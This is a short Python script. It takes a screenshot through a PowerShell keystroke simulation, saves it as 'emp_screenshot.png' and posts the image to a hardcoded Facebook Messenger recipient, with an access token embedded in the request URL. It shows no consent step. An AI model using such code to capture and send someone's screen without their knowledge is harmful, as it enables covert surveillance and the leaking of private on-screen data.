import requests
import os
import subprocess
import sys

def capture_and_send():
    file_path = r'D:\Bane_NLP\Screenshot\emp_screenshot.png'
    os.makedirs(os.path.dirname(file_path), exist_ok=True)
    
    # Capture via PowerShell
    ps_cmd = f"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('%{{PRTSC}}'); Start-Sleep -s 1; $img = [System.Windows.Forms.Clipboard]::GetImage(); $img.Save('{file_path}')"
    subprocess.run(['powershell', '-Command', ps_cmd], check=True)

    if not os.path.exists(file_path):
        print(f'Error: File {file_path} not found.')
        return

    # Messenger Push
    token = 'EAAWUxUYw6CYBOZC3Rj160oK22mObeN5VqS2e9C7eGshzB0XQ96ZCZALN8uA7jXvZA8Y7uQZA5K2ZBZArY9ZC6ZA9ZC8ZA7ZC'
    uid = '26917714517832064'
    url = f'https://graph.facebook.com/v19.0/me/messages?access_token={token}'

    with open(file_path, 'rb') as f:
        files = {'filedata': (os.path.basename(file_path), f, 'image/png')}
        data = {'recipient': '{"id": "' + uid + '"}', 'message': '{"attachment": {"type": "image", "payload": {}}}'}
        res = requests.post(url, files=files, data=data)
        print(res.text)

if __name__ == '__main__':
    capture_and_send()